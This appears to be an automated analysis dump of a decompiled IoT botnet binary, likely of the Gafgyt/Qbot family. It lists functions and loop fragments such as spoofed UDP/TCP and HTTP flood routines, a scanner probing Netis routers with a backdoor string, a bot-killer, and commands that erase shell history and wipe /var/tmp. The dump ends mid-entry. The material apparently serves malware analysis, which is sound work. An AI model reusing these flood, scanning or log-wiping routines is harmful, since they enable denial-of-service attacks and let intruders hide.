++++++++ FUNCTION LENGTH 333
        while (true) {
            while (true) {
                    int32_t v228 = __libc_recv(a1, v227, 1, 0); // 0x10003038
                                if (strstr(a6, (char *)a2, v227) != 0) {
                            int32_t v232 = __libc_recv(a1, v227 + 1, 2, 0); // 0x100030a8
=================FUNCTION : strstr ===================
++++++++ FUNCTION START 45163
++++++++ FUNCTION END 45520
++++++++ FUNCTION LENGTH 357
    while (true) {
    while (true) {
                while (true) {
    while (true) {
    while (true) {
=================FUNCTION : srandom_r ===================
++++++++ FUNCTION START 57951
++++++++ FUNCTION END 58261
++++++++ FUNCTION LENGTH 310
                while (true) {
                        __GI_random_r((int32_t *)v222, (int32_t)&v223);
                            __GI_random_r((int32_t *)v222, (int32_t)&v223);
            __GI_random_r((int32_t *)v222, (int32_t)&v223);
                __GI_random_r((int32_t *)v222, (int32_t)&v223);
=================FUNCTION : fflush_unlocked ===================
++++++++ FUNCTION START 41139
++++++++ FUNCTION END 41484
++++++++ FUNCTION LENGTH 345
            while (true) {
        _stdio_openlist_dec_use();
        _stdio_openlist_dec_use();
    while (true) {
    _stdio_openlist_dec_use();
=================FUNCTION : __GI_memchr ===================
++++++++ FUNCTION START 72799
++++++++ FUNCTION END 73144
++++++++ FUNCTION LENGTH 345
        while (true) {
        while (true) {
        while (true) {
    while (true) {
=================FUNCTION : socket_connect ===================
++++++++ FUNCTION START 14954
++++++++ FUNCTION END 15211
++++++++ FUNCTION LENGTH 257
    if (__GI_gethostbyname(a1) == 0) {
    int32_t v226 = socket(2, 1, 6); // 0x10006058
    __GI_setsockopt(v226, 6, 1, (int32_t)&v220, 4);
    if (__libc_connect(v226, v222, 16) == -1) {
=================FUNCTION : _vfprintf_internal ===================
++++++++ FUNCTION START 36955
++++++++ FUNCTION END 37890
++++++++ FUNCTION LENGTH 935
    while (true) {
        while (true) {
                            while (true) {
                                            while (true) {
=================FUNCTION : connectTimeout ===================
++++++++ FUNCTION START 11056
++++++++ FUNCTION END 11345
++++++++ FUNCTION LENGTH 289
    if (getHost(a2, &v222, v221) != 0) {
    if (__libc_connect(a1, v221, 16) > -1) {
        while (true) {
                getsockopt(a1, 1, 4, (int32_t)&v232, (int32_t)&v231);
=================FUNCTION : getcwd ===================
++++++++ FUNCTION START 28584
++++++++ FUNCTION END 28975
++++++++ FUNCTION LENGTH 391
            __GI_getpagesize();
                        free();
                free();
            free();
=================FUNCTION : realloc ===================
++++++++ FUNCTION START 54606
++++++++ FUNCTION END 54895
++++++++ FUNCTION LENGTH 289
        free();
            __heap_free(&v224, v222 + v220, v225 - v222);
        free();
=================FUNCTION : listFork ===================
++++++++ FUNCTION START 11348
++++++++ FUNCTION END 11600
++++++++ FUNCTION LENGTH 252
    int32_t result = __libc_fork(); // 0x100029e4
    while (true) {
                free();
=================FUNCTION : _stdlib_strto_l ===================
++++++++ FUNCTION START 59236
++++++++ FUNCTION END 59730
++++++++ FUNCTION LENGTH 494
    while (true) {
                        while (true) {
                while (true) {
=================FUNCTION : strncpy ===================
++++++++ FUNCTION START 44502
++++++++ FUNCTION END 44832
++++++++ FUNCTION LENGTH 330
        while (true) {
        while (true) {
        while (true) {
=================FUNCTION : strnlen ===================
++++++++ FUNCTION START 44835
++++++++ FUNCTION END 45160
++++++++ FUNCTION LENGTH 325
            while (true) {
    while (true) {
    while (true) {
=================FUNCTION : sockprintf ===================
++++++++ FUNCTION START 5512
++++++++ FUNCTION END 5741
++++++++ FUNCTION LENGTH 229
    print(&v221, a2, (int32_t)&v222);
    int32_t result = __libc_send(a1, v220, __GI_strlen(), 0x4000); // 0x10001270
    free();
=================FUNCTION : __GI_strncat ===================
++++++++ FUNCTION START 80085
++++++++ FUNCTION END 80400
++++++++ FUNCTION LENGTH 315
        while (true) {
                while (true) {
    while (true) {
=================FUNCTION : __GI_fclose ===================
++++++++ FUNCTION START 33418
++++++++ FUNCTION END 33687
++++++++ FUNCTION LENGTH 269
    if (__libc_close(v221) <= 0xffffffff) {
        free();
    _stdio_openlist_dec_use();
=================FUNCTION : botkiller ===================
++++++++ FUNCTION START 16809
++++++++ FUNCTION END 17051
++++++++ FUNCTION LENGTH 242
    while (true) {
            __libc_system(v220);
            __libc_system(v220);
=================FUNCTION : ClearHistory ===================
++++++++ FUNCTION START 17291
++++++++ FUNCTION END 17515
++++++++ FUNCTION LENGTH 224
    __libc_system((int32_t)"history -c;history -w");
    __libc_system((int32_t)"cd /root;rm -rf .bash_history");
    return __libc_system((int32_t)"cd /var/tmp; rm -f *");
=================FUNCTION : initConnection ===================
++++++++ FUNCTION START 24682
++++++++ FUNCTION END 24941
++++++++ FUNCTION LENGTH 259
        __libc_close(v221);
    int32_t v228 = socket(2, 1, 0); // 0x10009a58
    return connectTimeout(v228, v219, v226, 30, v219) == 0;
=================FUNCTION : __GI_vfprintf ===================
++++++++ FUNCTION START 36157
++++++++ FUNCTION END 36423
++++++++ FUNCTION LENGTH 266
        result = _vfprintf_internal();
    result = _vfprintf_internal();
=================FUNCTION : __GI_strpbrk ===================
++++++++ FUNCTION START 73970
++++++++ FUNCTION END 74229
++++++++ FUNCTION LENGTH 259
    while (true) {
        while (true) {
=================FUNCTION : _uintmaxtostr ===================
++++++++ FUNCTION START 67607
++++++++ FUNCTION END 67946
++++++++ FUNCTION LENGTH 339
        while (true) {
    while (true) {
=================FUNCTION : __libc_system ===================
++++++++ FUNCTION START 58519
++++++++ FUNCTION END 58783
++++++++ FUNCTION LENGTH 264
    int32_t v223 = __vfork(); // 0x1000ef38
        if (wait4(v223) == -1) {
=================FUNCTION : trim ===================
++++++++ FUNCTION START 2980
++++++++ FUNCTION END 3264
++++++++ FUNCTION LENGTH 284
    while (true) {
            while (true) {
=================FUNCTION : __GI_initstate_r ===================
++++++++ FUNCTION START 58264
++++++++ FUNCTION END 58516
++++++++ FUNCTION LENGTH 252
        srandom_r();
    srandom_r();
=================FUNCTION : execl ===================
++++++++ FUNCTION START 59972
++++++++ FUNCTION END 60263
++++++++ FUNCTION LENGTH 291
    while (true) {
    while (true) {
=================FUNCTION : _stdio_term ===================
++++++++ FUNCTION START 35643
++++++++ FUNCTION END 35916
++++++++ FUNCTION LENGTH 273
        while (true) {
    while (true) {
=================FUNCTION : inet_aton ===================
++++++++ FUNCTION START 74232
++++++++ FUNCTION END 74542
++++++++ FUNCTION LENGTH 310
    while (true) {
        while (true) {
=================FUNCTION : _stdio_openlist_dec_use ===================
++++++++ FUNCTION START 40850
++++++++ FUNCTION END 41136
++++++++ FUNCTION LENGTH 286
            while (true) {
                        free();
=================FUNCTION : read_with_timeout ===================
++++++++ FUNCTION START 9412
++++++++ FUNCTION END 9657
++++++++ FUNCTION LENGTH 245
    while (true) {
            return __libc_recv(a1, a3, a4, 0);
=================FUNCTION : __open_etc_hosts ===================
++++++++ FUNCTION START 83905
++++++++ FUNCTION END 84136
++++++++ FUNCTION LENGTH 231
    int32_t v220 = __GI_fopen((int32_t)"/etc/hosts", (int32_t)&v219); // 0x10012c90
        result = __GI_fopen((int32_t)"/etc/config/hosts", v221);
=================FUNCTION : matchPrompt ===================
++++++++ FUNCTION START 11880
++++++++ FUNCTION END 12171
++++++++ FUNCTION LENGTH 291
    while (true) {
        while (true) {
=================FUNCTION : __GI_strlen ===================
++++++++ FUNCTION START 44193
++++++++ FUNCTION END 44499
++++++++ FUNCTION LENGTH 306
        while (true) {
    while (true) {
=================FUNCTION : contains_string ===================
++++++++ FUNCTION START 10798
++++++++ FUNCTION END 11053
++++++++ FUNCTION LENGTH 255
        while (true) {
            if (strcasestr((char *)a1, v223, 4 * v222 + a2) == 0) {
=================FUNCTION : __GI_strchr ===================
++++++++ FUNCTION START 43374
++++++++ FUNCTION END 43705
++++++++ FUNCTION LENGTH 331
        while (true) {
    while (true) {
=================FUNCTION : memrchr ===================
++++++++ FUNCTION START 73373
++++++++ FUNCTION END 73718
++++++++ FUNCTION LENGTH 345
        while (true) {
        while (true) {
=================FUNCTION : abort ===================
++++++++ FUNCTION START 76450
++++++++ FUNCTION END 76790
++++++++ FUNCTION LENGTH 340
            __GI_sigprocmask(1, v220, 0);
        __GI_sigprocmask(1, v220, 0);
=================FUNCTION : __GI_fgets_unlocked ===================
++++++++ FUNCTION START 41487
++++++++ FUNCTION END 41809
++++++++ FUNCTION LENGTH 322
            while (true) {
                char v227 = getc_unlocked((int16_t *)a3, v223); // 0x1000cfac
=================FUNCTION : __stdio_WRITE ===================
++++++++ FUNCTION START 66071
++++++++ FUNCTION END 66390
++++++++ FUNCTION LENGTH 319
    while (true) {
            while (true) {
=================FUNCTION : __raise ===================
++++++++ FUNCTION START 84822
++++++++ FUNCTION END 85044
++++++++ FUNCTION LENGTH 222
    return kill(__libc_getpid(), a1);
=================FUNCTION : get_telstate_host ===================
++++++++ FUNCTION START 8954
++++++++ FUNCTION END 9176
++++++++ FUNCTION LENGTH 222
    return __GI_inet_ntoa(&v220, a1);
=================FUNCTION : getHost ===================
++++++++ FUNCTION START 7347
++++++++ FUNCTION END 7570
++++++++ FUNCTION LENGTH 223
    int32_t v220 = inet_addr(a1); // 0x10001a70
=================FUNCTION : getdtablesize ===================
++++++++ FUNCTION START 28978
++++++++ FUNCTION END 29207
++++++++ FUNCTION LENGTH 229
    if (getrlimit(7, (int32_t)&result) >= 0) {
=================FUNCTION : _ppfs_setargs ===================
++++++++ FUNCTION START 38400
++++++++ FUNCTION END 38810
++++++++ FUNCTION LENGTH 410
            while (true) {
=================FUNCTION : __GI_strcasecmp ===================
++++++++ FUNCTION START 46291
++++++++ FUNCTION END 46553
++++++++ FUNCTION LENGTH 262
    while (true) {
=================FUNCTION : __heap_alloc ===================
++++++++ FUNCTION START 54898
++++++++ FUNCTION END 55185
++++++++ FUNCTION LENGTH 287
    while (true) {
=================FUNCTION : makeIPPacket ===================
++++++++ FUNCTION START 14495
++++++++ FUNCTION END 14719
++++++++ FUNCTION LENGTH 224
    return rand_cmwc();
=================FUNCTION : __GI_inet_ntoa ===================
++++++++ FUNCTION START 49007
++++++++ FUNCTION END 49229
++++++++ FUNCTION LENGTH 222
    return __GI_inet_ntoa_r(&v219, (int32_t)&v220);
=================FUNCTION : __libc_sendto ===================
++++++++ FUNCTION START 51910
++++++++ FUNCTION END 52131
++++++++ FUNCTION LENGTH 221
    return __socketcall(11, (int32_t)&a1);
=================FUNCTION : inet_pton4 ===================
++++++++ FUNCTION START 80898
++++++++ FUNCTION END 81189
++++++++ FUNCTION LENGTH 291
    while (true) {
=================FUNCTION : fgets ===================
++++++++ FUNCTION START 40370
++++++++ FUNCTION END 40607
++++++++ FUNCTION LENGTH 237
    int32_t result = __GI_fgets_unlocked((char *)v220, a2, a3); // 0x1000cbc0
=================FUNCTION : __GI_setsockopt ===================
++++++++ FUNCTION START 52134
++++++++ FUNCTION END 52355
++++++++ FUNCTION LENGTH 221
    return __socketcall(14, (int32_t)&a1);
=================FUNCTION : __xpg_strerror_r ===================
++++++++ FUNCTION START 45750
++++++++ FUNCTION END 46063
++++++++ FUNCTION LENGTH 313
        while (true) {
=================FUNCTION : rand ===================
++++++++ FUNCTION START 56286
++++++++ FUNCTION END 56508
++++++++ FUNCTION LENGTH 222
    return random();
=================FUNCTION : __GI_strcoll ===================
++++++++ FUNCTION START 43708
++++++++ FUNCTION END 43952
++++++++ FUNCTION LENGTH 244
    while (true) {
=================FUNCTION : __encode_dotted ===================
++++++++ FUNCTION START 85517
++++++++ FUNCTION END 85820
++++++++ FUNCTION LENGTH 303
    while (true) {
=================FUNCTION : parseHex ===================
++++++++ FUNCTION START 6806
++++++++ FUNCTION END 7055
++++++++ FUNCTION LENGTH 249
    while (true) {
=================FUNCTION : makeRandomStr ===================
++++++++ FUNCTION START 8358
++++++++ FUNCTION END 8591
++++++++ FUNCTION LENGTH 233
            v220 = rand_cmwc();
=================FUNCTION : memcpy ===================
++++++++ FUNCTION START 42330
++++++++ FUNCTION END 42743
++++++++ FUNCTION LENGTH 413
        while (true) {
=================FUNCTION : isatty ===================
++++++++ FUNCTION START 47036
++++++++ FUNCTION END 47259
++++++++ FUNCTION LENGTH 223
    __GI_tcgetattr(&v220);
=================FUNCTION : _charpad ===================
++++++++ FUNCTION START 36426
++++++++ FUNCTION END 36674
++++++++ FUNCTION LENGTH 248
    while (true) {
=================FUNCTION : ioctl ===================
++++++++ FUNCTION START 26398
++++++++ FUNCTION END 26695
++++++++ FUNCTION LENGTH 297
            return __GI_tcgetattr((int32_t *)a3);
=================FUNCTION : __heap_alloc_at ===================
++++++++ FUNCTION START 55188
++++++++ FUNCTION END 55463
++++++++ FUNCTION LENGTH 275
    while (true) {
=================FUNCTION : __decode_dotted ===================
++++++++ FUNCTION START 85823
++++++++ FUNCTION END 86143
++++++++ FUNCTION LENGTH 320
    while (true) {
=================FUNCTION : __libc_recv ===================
++++++++ FUNCTION START 51462
++++++++ FUNCTION END 51683
++++++++ FUNCTION LENGTH 221
    return __socketcall(10, (int32_t)&a1);
=================FUNCTION : __length_dotted ===================
++++++++ FUNCTION START 86146
++++++++ FUNCTION END 86395
++++++++ FUNCTION LENGTH 249
    while (true) {
=================FUNCTION : sprintf ===================
++++++++ FUNCTION START 33915
++++++++ FUNCTION END 34139
++++++++ FUNCTION LENGTH 224
    return __GI_vsnprintf();
=================FUNCTION : tcpcsum ===================
++++++++ FUNCTION START 14265
++++++++ FUNCTION END 14492
++++++++ FUNCTION LENGTH 227
    free();
=================FUNCTION : __get_hosts_byname_r ===================
++++++++ FUNCTION START 75981
++++++++ FUNCTION END 76205
++++++++ FUNCTION LENGTH 224
    int32_t result = __read_etc_hosts_r(0, a1, a2, 0, (int32_t *)a3, a4, a5, (int32_t)&v220, a7); // 0x10011904
=================FUNCTION : szprintf ===================
++++++++ FUNCTION START 5287
++++++++ FUNCTION END 5509
++++++++ FUNCTION LENGTH 222
    return print(&a1, a2, (int32_t)&v220);
=================FUNCTION : __GI_wcsnrtombs ===================
++++++++ FUNCTION START 65741
++++++++ FUNCTION END 66068
++++++++ FUNCTION LENGTH 327
            while (true) {
=================FUNCTION : zprintf ===================
++++++++ FUNCTION START 5062
++++++++ FUNCTION END 5284
++++++++ FUNCTION LENGTH 222
    return print(NULL, a1, (int32_t)&v220);
=================FUNCTION : getsockopt ===================
++++++++ FUNCTION START 51238
++++++++ FUNCTION END 51459
++++++++ FUNCTION LENGTH 221
    return __socketcall(15, (int32_t)&a1);
=================FUNCTION : random ===================
++++++++ FUNCTION START 56511
++++++++ FUNCTION END 56738
++++++++ FUNCTION LENGTH 227
    __GI_random_r((int32_t *)((int32_t)&v219 - 0x1b48), (int32_t)&result);
=================FUNCTION : strcasestr ===================
++++++++ FUNCTION START 46556
++++++++ FUNCTION END 46808
++++++++ FUNCTION LENGTH 252
    while (true) {
=================FUNCTION : __check_one_fd ===================
++++++++ FUNCTION START 61712
++++++++ FUNCTION END 61948
++++++++ FUNCTION LENGTH 236
    int32_t v220 = __libc_open((int32_t)"/dev/null", a2); // 0x1000f6b8
=================FUNCTION : GetRandomIP ===================
++++++++ FUNCTION START 13663
++++++++ FUNCTION END 13886
++++++++ FUNCTION LENGTH 223
    return rand_cmwc() & -1 - a1 ^ v220 & a1;
=================FUNCTION : __libc_creat ===================
++++++++ FUNCTION START 30384
++++++++ FUNCTION END 30606
++++++++ FUNCTION LENGTH 222
    return __libc_open(577, 577);
=================FUNCTION : inet_addr ===================
++++++++ FUNCTION START 49232
++++++++ FUNCTION END 49461
++++++++ FUNCTION LENGTH 229
    if (inet_aton((char *)&result) != 0) {
=================FUNCTION : __GI_gethostbyname ===================
++++++++ FUNCTION START 49464
++++++++ FUNCTION END 49688
++++++++ FUNCTION LENGTH 224
    gethostbyname_r(a1, &v220, (int32_t)&v219, 460, (int32_t)&result, v218);
=================FUNCTION : malloc ===================
++++++++ FUNCTION START 54019
++++++++ FUNCTION END 54324
++++++++ FUNCTION LENGTH 305
            __heap_free((int32_t *)v228, v226, v229);
=================FUNCTION : __GI_inet_ntoa_r ===================
++++++++ FUNCTION START 48760
++++++++ FUNCTION END 49004
++++++++ FUNCTION LENGTH 244
    while (true) {
=================FUNCTION : __GI_strspn ===================
++++++++ FUNCTION START 80403
++++++++ FUNCTION END 80660
++++++++ FUNCTION LENGTH 257
    while (true) {
=================FUNCTION : __libc_send ===================
++++++++ FUNCTION START 51686
++++++++ FUNCTION END 51907
++++++++ FUNCTION LENGTH 221
    return __socketcall(9, (int32_t)&a1);
=================FUNCTION : srand ===================
++++++++ FUNCTION START 57206
++++++++ FUNCTION END 57431
++++++++ FUNCTION LENGTH 225
    srandom_r();
=================FUNCTION : sclose ===================
++++++++ FUNCTION START 14722
++++++++ FUNCTION END 14951
++++++++ FUNCTION LENGTH 229
        __libc_close(a1);
=================FUNCTION : __libc_connect ===================
++++++++ FUNCTION START 50790
++++++++ FUNCTION END 51011
++++++++ FUNCTION LENGTH 221
    return __socketcall(3, (int32_t)&a1);
=================FUNCTION : __libc_waitpid ===================
++++++++ FUNCTION START 32279
++++++++ FUNCTION END 32501
++++++++ FUNCTION LENGTH 222
    return wait4(0);
=================FUNCTION : __GI_vsnprintf ===================
++++++++ FUNCTION START 34142
++++++++ FUNCTION END 34378
++++++++ FUNCTION LENGTH 236
    int32_t result = _vfprintf_internal(); // 0x1000b558
=================FUNCTION : _ppfs_init ===================
++++++++ FUNCTION START 37893
++++++++ FUNCTION END 38162
++++++++ FUNCTION LENGTH 269
    while (true) {
=================FUNCTION : __GI_getsockname ===================
++++++++ FUNCTION START 51014
++++++++ FUNCTION END 51235
++++++++ FUNCTION LENGTH 221
    return __socketcall(6, (int32_t)&a1);
=================FUNCTION : __GI_fopen ===================
++++++++ FUNCTION START 33690
++++++++ FUNCTION END 33912
++++++++ FUNCTION LENGTH 222
    return _stdio_fopen(0, (char *)-1);
=================FUNCTION : rawmemchr ===================
++++++++ FUNCTION START 79777
++++++++ FUNCTION END 80082
++++++++ FUNCTION LENGTH 305
    while (true) {
=================FUNCTION : __GI__exit ===================
++++++++ FUNCTION START 27409
++++++++ FUNCTION END 27641
++++++++ FUNCTION LENGTH 232
    while (true) {
=================FUNCTION : fdgets ===================
++++++++ FUNCTION START 6556
++++++++ FUNCTION END 6803
++++++++ FUNCTION LENGTH 247
    while (true) {
=================FUNCTION : advance_state ===================
++++++++ FUNCTION START 9660
++++++++ FUNCTION END 9889
++++++++ FUNCTION LENGTH 229
        __libc_close(*a1);
=================FUNCTION : socket ===================
++++++++ FUNCTION START 52358
++++++++ FUNCTION END 52579
++++++++ FUNCTION LENGTH 221
    return __socketcall(1, (int32_t)&a1);
=================FUNCTION : free ===================
++++++++ FUNCTION START 54327
++++++++ FUNCTION END 54603
++++++++ FUNCTION LENGTH 276
    int32_t v221 = __heap_free(&v219, v218 - 4, v220); // 0x1000e510
=================FUNCTION : inet_ntop4 ===================
++++++++ FUNCTION START 81821
++++++++ FUNCTION END 82094
++++++++ FUNCTION LENGTH 273
    while (true) {
================================================================================
========	WHILE LOOPS INTRESTING INSTRUCTIONS : =================================
================================================================================
=============================WHILE LOOPS ID : 1 @ trim ====================================
++++++++ WHILE START : 3203 
++++++++ WHILE FUNCTION : trim 
++++++++ WHILE END : 3263 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 2 @ prints ====================================
++++++++ WHILE START : 3745 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 3756 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar((int32_t *)a1, v222);
=============================WHILE LOOPS ID : 3 @ prints ====================================
++++++++ WHILE START : 3891 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 3902 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar((int32_t *)a1, v222);
=============================WHILE LOOPS ID : 4 @ prints ====================================
++++++++ WHILE START : 4044 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 4055 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar((int32_t *)a1, v222);
=============================WHILE LOOPS ID : 6 @ print ====================================
++++++++ WHILE START : 4736 
++++++++ WHILE FUNCTION : print 
++++++++ WHILE END : 5051 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar(a1, (int32_t)*v225);
		while (true) {
		while (true) {
		result2 = prints(v221, v245, v234, v230) + result;
		int32_t v248 = printi(v221, v247, 10, 1, v234, v230, 97) + result; // 0x10000cb0
		int32_t v250 = printi(v221, v249, 16, 0, v234, v230, 97) + result; // 0x10000d64
		int32_t v252 = printi(v221, v251, 16, 0, v234, v230, 65) + result; // 0x10000e18
		int32_t v254 = printi(v221, v253, 10, 0, v234, v230, 97) + result; // 0x10000ecc
		int32_t v256 = prints(v221, (char *)&v224, v234, v230); // 0x10000f7c
		printchar(a1, (int32_t)*v225);
=============================WHILE LOOPS ID : 7 @ fdpclose ====================================
++++++++ WHILE START : 6522 
++++++++ WHILE FUNCTION : fdpclose 
++++++++ WHILE END : 6545 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__libc_waitpid(v226, (int32_t)&v225, 0) == -1) {
		__GI_sigprocmask(2, v224, 0);
=============================WHILE LOOPS ID : 10 @ getBogos ====================================
++++++++ WHILE START : 8040 
++++++++ WHILE FUNCTION : getBogos 
++++++++ WHILE END : 8105 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fdgets(v221, 0x1000, v219) == 0) {
		__libc_close(v219);
		uppercase((char *)&v220);
		if (strstr(v221, "BOGOMIPS", (int32_t)&v222) == v221) {
		while (true) {
		while (true) {
		__libc_close(v219);
=============================WHILE LOOPS ID : 11 @ getCores ====================================
++++++++ WHILE START : 8333 
++++++++ WHILE FUNCTION : getCores 
++++++++ WHILE END : 8354 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fdgets(v221, 0x1000, v219) == 0) {
		__libc_close(v219);
		uppercase((char *)&v220);
		int32_t v223 = strstr(v221, "BOGOMIPS", (int32_t)&v222); // 0x10001db4
=============================WHILE LOOPS ID : 12 @ recvLine ====================================
++++++++ WHILE START : 8836 
++++++++ WHILE FUNCTION : recvLine 
++++++++ WHILE END : 8931 
++++++++ INTRESTING INSTRUCTIONS :  
		sockprintf(v230, (int32_t)"PING", (int32_t)&v229);
		while (true) {
		while (true) {
		if (__libc_recv(v230, (int32_t)&v236, 1, 0) != 1) {
		while (true) {
=============================WHILE LOOPS ID : 14 @ read_with_timeout ====================================
++++++++ WHILE START : 9639 
++++++++ WHILE FUNCTION : read_with_timeout 
++++++++ WHILE END : 9656 
++++++++ INTRESTING INSTRUCTIONS :  
		return __libc_recv(a1, a3, a4, 0);
=============================WHILE LOOPS ID : 15 @ contains_string ====================================
++++++++ WHILE START : 11030 
++++++++ WHILE FUNCTION : contains_string 
++++++++ WHILE END : 11047 
++++++++ INTRESTING INSTRUCTIONS :  
		if (strcasestr((char *)a1, v223, 4 * v222 + a2) == 0) {
=============================WHILE LOOPS ID : 16 @ connectTimeout ====================================
++++++++ WHILE START : 11310 
++++++++ WHILE FUNCTION : connectTimeout 
++++++++ WHILE END : 11341 
++++++++ INTRESTING INSTRUCTIONS :  
		getsockopt(a1, 1, 4, (int32_t)&v232, (int32_t)&v231);
=============================WHILE LOOPS ID : 17 @ listFork ====================================
++++++++ WHILE START : 11579 
++++++++ WHILE FUNCTION : listFork 
++++++++ WHILE END : 11599 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
=============================WHILE LOOPS ID : 18 @ matchPrompt ====================================
++++++++ WHILE START : 12109 
++++++++ WHILE FUNCTION : matchPrompt 
++++++++ WHILE END : 12170 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 19 @ readUntil ====================================
++++++++ WHILE START : 12402 
++++++++ WHILE FUNCTION : readUntil 
++++++++ WHILE END : 12501 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		int32_t v228 = __libc_recv(a1, v227, 1, 0); // 0x10003038
		if (strstr(a6, (char *)a2, v227) != 0) {
		int32_t v232 = __libc_recv(a1, v227 + 1, 2, 0); // 0x100030a8
=============================WHILE LOOPS ID : 21 @ StartTheLelz ====================================
++++++++ WHILE START : 15469 
++++++++ WHILE FUNCTION : StartTheLelz 
++++++++ WHILE END : 15588 
++++++++ INTRESTING INSTRUCTIONS :  
		GetRandomPublicIP(v234);
		socket(2, 1, 0);
		if (__libc_connect(*v233, (int32_t)&v220, 16) == -1) {
		socket(2, 1, 0);
=============================WHILE LOOPS ID : 26 @ sendSTD ====================================
++++++++ WHILE START : 15871 
++++++++ WHILE FUNCTION : sendSTD 
++++++++ WHILE END : 15894 
++++++++ INTRESTING INSTRUCTIONS :  
		random();
		__libc_send(v220, v231, 65, 0);
		__libc_connect(v220, v224, 16);
		__libc_close(v220);
=============================WHILE LOOPS ID : 27 @ sendUDP ====================================
++++++++ WHILE START : 16154 
++++++++ WHILE FUNCTION : sendUDP 
++++++++ WHILE END : 16196 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		__libc_sendto(v224, v225, a5, 0, v219, 16, v219);
		rand_cmwc();
=============================WHILE LOOPS ID : 28 @ sendUDP ====================================
++++++++ WHILE START : 16256 
++++++++ WHILE FUNCTION : sendUDP 
++++++++ WHILE END : 16311 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		__libc_sendto(v231, v236, a5 + 28, 0, v219, 16, v219);
		*v237 = (int16_t)rand_cmwc();
		v252 = rand_cmwc();
		*(int16_t *)(v236 | 4) = (int16_t)rand_cmwc();
		*(int32_t *)(v236 | 12) = htonl(GetRandomIP(v234));
=============================WHILE LOOPS ID : 29 @ sendTCP ====================================
++++++++ WHILE START : 16616 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 16700 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__GI_strcoll(v247, (int32_t)"rst") == 0) {
		if (__GI_strcoll(v247, (int32_t)"psh") == 0) {
		sockprintf(v222, (int32_t)"Invalid flag \"%s\"", v246);
=============================WHILE LOOPS ID : 30 @ sendTCP ====================================
++++++++ WHILE START : 16725 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 16755 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v220, v227, v225, 0, v218, 16, v218);
		v236 = GetRandomIP(v224);
		*(int16_t *)(v227 | 4) = (int16_t)rand_cmwc();
		*v233 = rand_cmwc();
		*v229 = (int16_t)rand_cmwc();
		*v240 = (int16_t)tcpcsum(v227, v239, v228);
=============================WHILE LOOPS ID : 31 @ sendTCP ====================================
++++++++ WHILE START : 16782 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 16798 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v220, v227, v225, 0, v218, 16, v218);
		v236 = GetRandomIP(v224);
		*(int16_t *)(v227 | 4) = (int16_t)rand_cmwc();
		*v233 = rand_cmwc();
		*v229 = (int16_t)rand_cmwc();
		*v240 = (int16_t)tcpcsum(v227, v239, v228);
=============================WHILE LOOPS ID : 32 @ botkiller ====================================
++++++++ WHILE START : 17032 
++++++++ WHILE FUNCTION : botkiller 
++++++++ WHILE END : 17050 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_system(v220);
		__libc_system(v220);
=============================WHILE LOOPS ID : 33 @ NetisScanner ====================================
++++++++ WHILE START : 17278 
++++++++ WHILE FUNCTION : NetisScanner 
++++++++ WHILE END : 17287 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v222 = socket(2, 2, 17); // 0x100080e8
		NetisRanges();
		__libc_sendto(v222, (int32_t)"AAAAAAAAnetcore", __GI_strlen(), 0, v221, 16, v221);
		__libc_sendto(v222, (int32_t)"AA", __GI_strlen(), 0, v221, 16, v221);
		__libc_close(v222);
=============================WHILE LOOPS ID : 34 @ sendHTTP ====================================
++++++++ WHILE START : 17755 
++++++++ WHILE FUNCTION : sendHTTP 
++++++++ WHILE END : 17805 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__libc_fork() != 0) {
		while (true) {
		int32_t v228 = socket_connect(a1, a3); // 0x1000838c
		__libc_close(v229);
=============================WHILE LOOPS ID : 35 @ processCmd ====================================
++++++++ WHILE START : 18882 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18899 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendTCP(v227, v266, v267, v268, v269, v229, v230);
=============================WHILE LOOPS ID : 37 @ processCmd ====================================
++++++++ WHILE START : 18985 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18991 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 40 @ processCmd ====================================
++++++++ WHILE START : 19104 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19155 
++++++++ INTRESTING INSTRUCTIONS :  
		sockprintf(v212, (int32_t)"None Killed.", 0x10020000);
		sockprintf(v212, (int32_t)"Killed %d.", v312);
		if (*v317 != __libc_getpid()) {
		kill(v319, 9);
=============================WHILE LOOPS ID : 41 @ processCmd ====================================
++++++++ WHILE START : 19174 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19191 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendSTD(v301, v307, v308);
=============================WHILE LOOPS ID : 45 @ processCmd ====================================
++++++++ WHILE START : 19279 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19297 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendCNC(v292, v298, v299);
		__libc_close(v212);
=============================WHILE LOOPS ID : 47 @ processCmd ====================================
++++++++ WHILE START : 19353 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19359 
